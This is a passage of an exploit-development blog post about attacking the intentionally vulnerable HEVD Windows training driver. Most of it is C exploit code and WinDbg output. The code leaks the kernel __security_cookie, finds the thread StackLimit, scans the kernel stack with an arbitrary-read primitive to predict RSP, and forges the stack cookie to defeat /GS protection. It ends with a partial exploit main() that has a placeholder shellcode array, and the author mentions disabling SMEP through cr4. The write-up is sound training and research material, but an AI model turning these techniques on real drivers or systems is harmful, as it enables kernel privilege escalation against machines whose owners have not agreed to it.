+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] __security_cookie leaked: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">securityValue</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] Driver Leak Handle closing...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hFileLeak</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">status</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Now we have to verify the value of the driver is correct.</p>
+<p><img src="image-6.png" alt="alt text" loading="lazy" /></p>
+<p>The leak is correct, but we&rsquo;re still getting a blue screen, because right after saving the security cookie value, it performs an XOR operation on the RSP address:
+<img src="image-7.png" alt="" loading="lazy" /></p>
+<h3>Leaking RSP<span class="hx-absolute -hx-mt-20" id="leaking-rsp"></span>
+    <a href="#leaking-rsp" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>PWe have the raw <code>__security_cookie</code>, but as seen in the XOR instruction above, what the driver actually stores on the stack is:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>stack_cookie = __security_cookie XOR RSP</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>So to forge a valid cookie we need to know the exact RSP value at the moment <code>TriggerBufferOverflowStackGS</code> executes. We have to predict rsp value from usermode before sending the payload.</p>
+<p>In this case we will be leaking with <code>StackLimit</code>.</p>
+<h4>StackLimit<span class="hx-absolute -hx-mt-20" id="stacklimit"></span>
+    <a href="#stacklimit" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>As we know, the kernel stacks grows downwards, the <em>StackLimit</em> is the lowest valid address of the klernel stack. If we start scanning from there upward, we will traverse the entire kernel stack (of our current thread), incluiding the call chain that led to out IOTCL handler.</p>
+<p>To obtain the StackLimit value we have to use <code>NtQuerySystemInformation</code> with <code>SystemExtendedProcessInformation</code> class, which returns extended thread information:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ULONG64</span> <span class="nf">GetStackLimit</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[*] Extracting StackLimit value...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">returnLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">NtQuerySystemInformation</span><span class="p">((</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">)</span><span class="mi">57</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">returnLength</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">PSYSTEM_EXTENDED_PROCESS_INFORMATION</span> <span class="n">pProcInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSYSTEM_EXTENDED_PROCESS_INFORMATION</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">returnLength</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">NT_SUCCESS</span><span class="p">(</span><span class="nf">NtQuerySystemInformation</span><span class="p">((</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">)</span><span class="mi">57</span><span class="p">,</span> <span class="n">pProcInfo</span><span class="p">,</span> <span class="n">returnLength</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">returnLength</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">DWORD</span> <span class="n">currentPid</span> <span class="o">=</span> <span class="nf">GetCurrentProcessId</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">DWORD</span> <span class="n">currentTid</span> <span class="o">=</span> <span class="nf">GetCurrentThreadId</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t\t</span><span class="s">[+] Current Process ID: 0x%lX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">currentPid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t\t</span><span class="s">[+] Current Thread ID:  0x%lX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">currentTid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">PSYSTEM_EXTENDED_PROCESS_INFORMATION</span> <span class="n">pCurrProc</span> <span class="o">=</span> <span class="n">pProcInfo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">pCurrProc</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">((</span><span class="n">DWORD_PTR</span><span class="p">)(</span><span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">ProcessInfo</span><span class="p">.</span><span class="n">UniqueProcessId</span><span class="p">)</span> <span class="o">==</span> <span class="n">currentPid</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="n">ULONG</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">ProcessInfo</span><span class="p">.</span><span class="n">NumberOfThreads</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">((</span><span class="n">DWORD_PTR</span><span class="p">)(</span><span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">Threads</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ThreadInfo</span><span class="p">.</span><span class="n">ClientId</span><span class="p">.</span><span class="n">UniqueThread</span><span class="p">)</span> <span class="o">==</span> <span class="n">currentTid</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">ULONG64</span> <span class="n">stackLimit</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">Threads</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">StackLimit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                        <span class="nf">free</span><span class="p">(</span><span class="n">pProcInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t\t</span><span class="s">[+] StackLimit found: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">stackLimit</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">stackLimit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">ProcessInfo</span><span class="p">.</span><span class="n">NextEntryOffset</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pCurrProc</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSYSTEM_EXTENDED_PROCESS_INFORMATION</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">pCurrProc</span> <span class="o">+</span> <span class="n">pCurrProc</span><span class="o">-&gt;</span><span class="n">ProcessInfo</span><span class="p">.</span><span class="n">NextEntryOffset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pProcInfo</span><span class="p">)</span> <span class="nf">free</span><span class="p">(</span><span class="n">pProcInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h4>Stack Search<span class="hx-absolute -hx-mt-20" id="stack-search"></span>
+    <a href="#stack-search" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>We exploit our arbitrary read primitive to scan the kernel stack from StackLimit upward, 8 bytes at a time, until we find that exact value:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x7000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leakedValue</span> <span class="o">=</span> <span class="nf">ArbitraryRead64</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="n">currentAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readOk</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">leakedValue</span> <span class="o">==</span> <span class="n">HEVD_IOCTL_ARBITRARY_WRITE</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// 0x222007
+</span></span></span><span class="line"><span class="cl">        <span class="n">ctlCodeAddress</span> <span class="o">=</span> <span class="n">currentAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">currentAddress</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h4>RSP offset from StackLimit<span class="hx-absolute -hx-mt-20" id="rsp-offset-from-stacklimit"></span>
+    <a href="#rsp-offset-from-stacklimit" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>Once we locate the IOCTL value on the stack, we know its exact kernel address, from there subtracting a fixed offset gives us the RSP at the entry of the main function: <code>TriggerBufferOverflowStackGS</code>.</p>
+<p>The logic to obtain this fixed offset was searching in the thread stack the IOCTL value, as we do in the C-code, and subtracting it from the rsp value.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">10</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="n">s</span> <span class="o">-</span><span class="n">q</span> <span class="n">rsp</span> <span class="n">L1000</span> <span class="mi">222007</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffffe484</span><span class="err">`</span><span class="n">d68087d8</span>  <span class="mo">00000000</span><span class="err">`</span><span class="mo">00222007</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">00000002</span>
+</span></span><span class="line"><span class="cl"><span class="n">ffffe484</span><span class="err">`</span><span class="n">d6808ab8</span>  <span class="mo">00000000</span><span class="err">`</span><span class="mo">00222007</span> <span class="mo">00000221</span><span class="err">`</span><span class="mf">29ff</span><span class="n">ea00</span>
+</span></span><span class="line"><span class="cl"><span class="mi">10</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="o">?</span> <span class="n">ffffe484</span><span class="err">`</span><span class="nf">d68087d8</span> <span class="p">(</span><span class="n">ioctl</span> <span class="n">address</span><span class="p">)</span> <span class="o">-</span> <span class="nf">ffffe484d6808530</span> <span class="p">(</span><span class="n">rsp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Evaluate</span> <span class="nl">expression</span><span class="p">:</span> <span class="mi">680</span> <span class="o">=</span> <span class="mo">00000000</span><span class="err">`</span><span class="mo">000002</span><span class="n">a8</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Knowing this we can bypass the <code>__security_check_cookie</code>:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ULONG64</span> <span class="nf">CalculateFinalStackCookie</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDriver</span><span class="p">,</span> <span class="n">ULONG64</span> <span class="n">originalCookie</span><span class="p">,</span> <span class="n">ULONG64</span> <span class="n">stackLimit</span><span class="p">,</span> <span class="n">ULONG64</span><span class="o">*</span> <span class="n">outRSP</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">ctlCodeAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">currentAddress</span> <span class="o">=</span> <span class="n">stackLimit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">leakedValue</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[*] Searching IOCTL (0x22200B) value...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x7000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BOOL</span> <span class="n">readOk</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">leakedValue</span> <span class="o">=</span> <span class="nf">ArbitraryRead64</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="n">currentAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readOk</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">readOk</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Error while calling ArbitraryRead64</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">leakedValue</span> <span class="o">==</span> <span class="n">HEVD_IOCTL_ARBITRARY_WRITE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ctlCodeAddress</span> <span class="o">=</span> <span class="n">currentAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] IOCTL found @ 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ctlCodeAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">currentAddress</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ctlCodeAddress</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[-] IOCTL doesn&#39;t found in the stack</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">predictedRSP</span> <span class="o">=</span> <span class="n">ctlCodeAddress</span> <span class="o">-</span> <span class="n">RSP_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] RSP value: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">predictedRSP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">finalCookie</span> <span class="o">=</span> <span class="n">originalCookie</span> <span class="o">^</span> <span class="n">predictedRSP</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Final cookie: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">finalCookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">outRSP</span> <span class="o">=</span> <span class="n">predictedRSP</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">finalCookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="image-8.png" alt="" loading="lazy" /></p>
+<h3>Calculating registers offsets<span class="hx-absolute -hx-mt-20" id="calculating-registers-offsets"></span>
+    <a href="#calculating-registers-offsets" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Tbh, I don&rsquo;t used this because the explotation isn&rsquo;t completed, but as we saw in the last screenshot, some RBP and RIP offsets were calculated before, thats was thanks to the cyclic pattern of wiremask:</p>
+<p><img src="image-9.png" alt="" loading="lazy" /></p>
+<p>Knowing this offsets can be usefull for a stack pivot, rop chain, etcetc. As the Nx protection is on our page, while trying to execute any code we will get the BSOD with the stop code: <code>ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY</code>, you can create a ROP chain to bypass that, but to be honest, I prefer doing any other research on windows.</p>
+<h2>Conclusion<span class="hx-absolute -hx-mt-20" id="conclusion"></span>
+    <a href="#conclusion" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>I will share you the final code I have in the moment, if someone wants to stack pivot this or create a complex rop chain for LPE goodluck, I just remove SMEP from the <code>cr4</code> register haha</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;Header.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nf">CreateFile</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Driver not found: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Driver handle @ %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="mh">0xdeadbeef</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">hevdBaseAddr</span> <span class="o">=</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;HEVD.sys&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Driver Base Address @ 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hevdBaseAddr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">securityCookie</span><span class="p">,</span> <span class="n">securityCookieAddr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Leaking __security_cookie...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">intBool</span> <span class="o">=</span> <span class="nf">getSecurityCookie</span><span class="p">(</span><span class="n">hevdBaseAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">securityCookie</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">securityCookieAddr</span><span class="p">);</span>   
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">intBool</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Calculating final cookie:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">stackLimit</span> <span class="o">=</span> <span class="nf">GetStackLimit</span><span class="p">();</span>
